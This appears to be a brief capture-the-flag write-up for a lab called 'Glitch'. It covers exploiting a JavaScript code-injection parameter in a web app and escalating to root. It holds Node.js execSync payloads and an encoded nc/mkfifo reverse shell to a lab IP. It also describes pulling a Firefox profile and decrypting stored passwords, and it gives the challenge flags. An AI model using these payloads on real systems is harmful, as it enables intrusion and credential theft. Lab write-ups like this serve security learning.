# Glitch

Challenge showcasing a web app and simple privilege escalation. Can you find the glitch?

## Notes
```
```

## Questions
1. What is your access token?
```
this_is_not_real
```

2. What is the content of user.txt?
```
using decoded access token as a cookie reaveals another endpoint
using POST method gives something interesting
fuzzing parameter gives error for cmd parameter
cmd can execute js

raw payloads
fs=require('fs');JSON.stringify(fs.readFileSync(__filename,{encoding:'utf8', flag:'r'}));

const { execSync } = require("child_process");
JSON.stringify(execSync('ls -al'));

?cmd=require('child_process').execSync(decodeURIComponent('ls -al /home'))

THM{i_don't_know_why}
```

3. What is the content of root.txt?
```
find suid binaries
vulnerability_exploited 
/bin/ping
/bin/mount
/bin/fusermount
/bin/umount
/bin/su

REVERSE SHELL
/api/items?cmd=require('child_process').execSync(decodeURIComponent('rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E9%2E18%2E129%209999%20%3E%2Ftmp%2Ff'))

stablalize shell

/home/user/.firefox directory
copy using nc
firefox_decrypt

su v0id
use doas

THM{diamonds_break_our_aching_minds}
```